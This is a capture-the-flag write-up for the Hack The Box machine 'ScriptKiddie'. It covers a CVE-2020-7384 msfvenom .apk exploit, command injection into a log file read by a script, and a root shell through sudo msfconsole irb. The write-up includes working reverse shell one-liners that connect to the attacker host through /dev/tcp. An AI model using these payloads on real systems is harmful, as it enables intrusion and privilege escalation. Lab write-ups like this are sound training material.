# Target
| Category          | Details                                                          |
|-------------------|------------------------------------------------------------------|
| 📝 **Name**       | [ScriptKiddie](https://app.hackthebox.com/machines/ScriptKiddie) |  
| 🏷 **Type**       | HTB Machine                                                      |
| 🖥 **OS**         | Linux                                                            |
| 🎯 **Difficulty** | Easy                                                             |
| 📁 **Tags**       | Metasploit, CVE-2020-7384, command injection, irb                |

# Scan
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
```

# Attack path
1. [Gain initial foothold with arbitrary command execution using `msfvenom` .apk handling vulnerability (CVE-2020-7384)](#gain-initial-foothold-with-arbitrary-command-execution-using-msfvenom-apk-handling-vulnerability-cve-2020-7384)
2. [Escalate to `pwn` user using discovered command injection vulnerability in `/home/pwn/scanlosers.sh` script](#escalate-to-pwn-user-using-discovered-command-injection-vulnerability-in-homepwnscanloserssh-script)
3. [Escalate to `root` user using Interactive Ruby Shell in `msfconsole`](#escalate-to-root-user-using-interactive-ruby-shell-in-msfconsole)


### Gain initial foothold with arbitrary command execution using `msfvenom` .apk handling vulnerability ([CVE-2020-7384](https://nvd.nist.gov/vuln/detail/CVE-2020-7384))

#### Generate malicious .apk which will spawn reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB ScriptKiddie]
└─$ LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) && \
COMMAND=$(echo -n "bash -c \"bash -i &>/dev/tcp/$LHOST/4444 0>&1\"" | base64 -w 0) && \
DNAME="CN='|echo $COMMAND | base64 -d | sh #" && \
touch empty && \
zip -jq app.apk empty && \
keytool -genkey -keystore signing.keystore -alias signing.key -storepass password -keypass password -keyalg RSA -keysize 2048 -dname "$DNAME" > /dev/null 2>&1 && \
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore signing.keystore -storepass password -keypass password app.apk signing.key > /dev/null 2>&1
```

#### Start netcat and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB ScriptKiddie]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Upload malicious .apk
```
┌──(magicrc㉿perun)-[~/attack/HTB ScriptKiddie]
└─$ curl http://$TARGET:5000 \
    -F os=android \
    -F lhost=127.0.0.1 \
    -F template=@app.apk \
    -F action=generate
```

#### Confirm initial foothold gained
```
connect to [10.10.16.5] from (UNKNOWN) [10.129.137.244] 59812
bash: cannot set terminal process group (938): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ id
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

#### Upgrade reverse shell connection to SSH using private key
```
kid@scriptkiddie:~/html$ ssh-keygen -t rsa -b 4096 -f /home/kid/.ssh/id_rsa -N "" && \
cat /home/kid/.ssh/id_rsa.pub >> /home/kid/.ssh/authorized_keys && \
chmod 700 /home/kid/.ssh && chmod 600 /home/kid/.ssh/* &&
cat /home/kid/.ssh/id_rsa
Generating public/private rsa key pair.
Your identification has been saved in /home/kid/.ssh/id_rsa
Your public key has been saved in /home/kid/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:njmvu8KUZuqSzGwxP0+l7H+nJbVAtU++iHpsZuzVL3E kid@scriptkiddie
The key's randomart image is:
+---[RSA 4096]----+
|            .    |
|           . .   |
|          . . .  |
|         .   +   |
|       .S . . o  |
|  o  .=+ o + +..E|
| + = *+ =oo = oo |
|  B +oo  +O+. .. |
| . o.ooo*@+o   ..|
+----[SHA256]-----+
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

Copy & paste generated key to attack machine and use it to connect.
```
┌──(magicrc㉿perun)-[~/attack/HTB ScriptKiddie]
└─$ chmod 600 id_rsa && ssh kid@$TARGET -i id_rsa
<SNIP>
kid@scriptkiddie:~$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```

### Escalate to `pwn` user using discovered command injection vulnerability in `/home/pwn/scanlosers.sh` script

#### Discover command injection vulnerability
Vulnerability sits in line 7.
```
kid@scriptkiddie:~$ cat -n /home/pwn/scanlosers.sh
     1  #!/bin/bash
     2
     3  log=/home/kid/logs/hackers
     4
     5  cd /home/pwn/
     6  cat $log | cut -d' ' -f3- | sort -u | while read ip; do
     7      sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
     8  done
     9
    10  if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

#### Start netcat and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB ScriptKiddie]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Inject command to spawn reverse shell
```
kid@scriptkiddie:~$ echo "1 1 127.0.0.1; bash -c \"bash -i &>/dev/tcp/10.10.16.5/4444 0>&1\" #" > /home/kid/logs/hackers
```

#### Confirm escalation
```
connect to [10.10.16.5] from (UNKNOWN) [10.129.137.244] 59938
bash: cannot set terminal process group (801): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ id
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$ 
```

### Escalate to `root` user using Interactive Ruby Shell in `msfconsole`

#### Stabilise shell
```
pwn@scriptkiddie:~$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
pwn@scriptkiddie:~$ export TERM=xterm
export TERM=xterm
```

#### List allowed sudo commands
```
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

#### Spawn root shell using `msfconsole` and `irb`
```
pwn@scriptkiddie:~$ sudo msfconsole -q
sudo msfconsole -q
msf6 > irb
irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
▽^[[47;2Rsystem("/bin/sh")
^[[47;1R
>> system("/bin/sh")
# id
id
uid=0(root) gid=0(root) groups=0(root)
```